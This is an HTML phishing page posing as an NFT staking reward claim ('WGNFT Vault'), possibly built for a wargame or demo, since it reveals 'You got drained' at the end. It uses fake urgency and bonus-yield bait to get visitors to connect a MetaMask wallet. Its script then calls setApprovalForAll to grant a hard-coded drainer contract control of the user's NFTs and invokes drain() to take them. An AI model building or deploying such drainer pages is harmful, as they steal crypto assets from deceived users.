<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>WGNFT Vault | Claim Your Reward</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
      color: #fff;
      text-align: center;
      padding: 2rem;
      background-attachment: fixed;
      background-size: cover;
    }
    .card {
      background: rgba(0, 0, 0, 0.8);
      border-radius: 10px;
      padding: 2rem;
      box-shadow: 0 0 18px #26a69a;
      max-width: 500px;
      margin: 0 auto;
    }
    button {
      padding: 1rem 2rem;
      margin-top: 1rem;
      font-size: 1rem;
      background: #26a69a;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
    }
    .danger {
      background: #e74c3c;
    }
    #status {
      margin-top: 2rem;
      font-size: 1.2rem;
      white-space: pre-wrap;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>🎁 Claim Your WGNFT Reward</h1>
    <p>Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>Offer ends in <strong>3h 42m</strong>.</p>
    <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
    <button id="connectBtn">Connect Wallet</button>
    <button id="previewBtn">Preview Claim</button>
    <button id="claimBtn" style="display: none;">Confirm Claim</button>
    <div id="status"></div>
  </div>

  <script>
    const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
    const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";

    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function isApprovedForAll(address owner, address operator) external view returns (bool)"
    ];

    const drainerABI = [
      "function drain(address nft, address victim) external"
    ];

    let provider, signer, nft, drainer;

    document.getElementById("connectBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!window.ethereum) {
        alert("Please install MetaMask to use this dApp.");
        return;
      }
      try {
        status.innerText = "⏳ Connecting wallet...";
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();

        const userAddress = await signer.getAddress();
        nft = new ethers.Contract(nftAddress, nftABI, signer);
        drainer = new ethers.Contract(drainerAddress, drainerABI, signer);

        status.innerText = `✅ Connected: ${userAddress}`;
      } catch (err) {
        console.error("Connection error:", err);
        status.innerText = `❌ Connection failed.\n\n${err.message}`;
      }
    };

    document.getElementById("previewBtn").onclick = () => {
      document.getElementById("status").innerText = "📦 Previewing reward calculation...\n\nEstimated reward: 420 WGFAKE\nStake Duration: 12 days\nNetwork Fee: 0.002 ETH";
      document.getElementById("claimBtn").style.display = "inline-block";
    };

    document.getElementById("claimBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!signer) return alert("Connect your wallet first.");

      try {
        status.innerText = "🔐 Requesting NFT claim rights...";
        const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
        await approvalTx.wait();

        const userAddress = await signer.getAddress();
        status.innerText = "🚀 Claim rights granted. Finalizing reward...";

        const drainTx = await drainer.drain(nftAddress, userAddress);
        await drainTx.wait();

        status.innerText = "💀 Oops! You got drained. This was a trap!";
        document.getElementById("claimBtn").disabled = true;
      } catch (err) {
        console.error("Drain error:", err);
        status.innerText = `🎯 You avoided the trap.\n\n${err.message}`;
      }
    };
  </script>
</body>
</html>
